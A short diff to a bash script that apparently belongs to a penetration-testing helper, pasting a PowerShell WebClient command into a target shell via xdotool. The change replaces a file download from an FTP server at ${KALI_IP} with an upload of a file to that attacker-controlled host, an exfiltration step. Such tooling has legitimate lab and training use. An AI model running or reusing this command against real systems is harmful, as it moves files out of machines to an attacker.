@@ -14,5 +14,5 @@ generate_form "${LOCAL_FILE_FIELD}" "${REMOTE_FILE_FIELD}"
 LOCAL_FILE=${form_data["local_file"]}
 REMOTE_FILE=${form_data["remote_file"]}
 
-paste_command "(New-Object Net.WebClient).DownloadFile('ftp://${KALI_IP}/${LOCAL_FILE}', '${REMOTE_FILE}')"
+paste_command "(New-Object Net.WebClient).UploadFile('ftp://${KALI_IP}/${LOCAL_FILE}', '${REMOTE_FILE}')"
 xdotool key Return
